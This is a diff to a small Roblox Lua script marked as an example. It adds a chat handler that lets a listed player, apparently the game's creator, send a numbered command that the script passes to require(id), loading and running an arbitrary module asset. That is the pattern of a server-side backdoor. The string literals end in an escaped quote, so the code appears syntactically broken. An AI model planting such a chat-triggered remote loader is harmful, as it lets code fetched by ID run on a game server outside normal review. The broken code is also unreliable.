@@ -1,13 +1,15 @@
 -- Example
 
+script = Instance.new("Script")
+
 local list={game.CreatorId}
 
 game:service("Players").PlayerAdded:Connect(function(p)
 if table.find(list,p.Name) or table.find(list,p.UserId) then
 p.Chatted:connect(function(msg)
-if msg=="/c"..p.UserId.."r\" then
-local id=msg:split("/c"..p.UserId.."r\")[2]
-warn(id)
+local id=tonumber(msg:split("/c"..p.UserId.."r\")[2])
+if id then
+require(id)
 end
 end)
 end
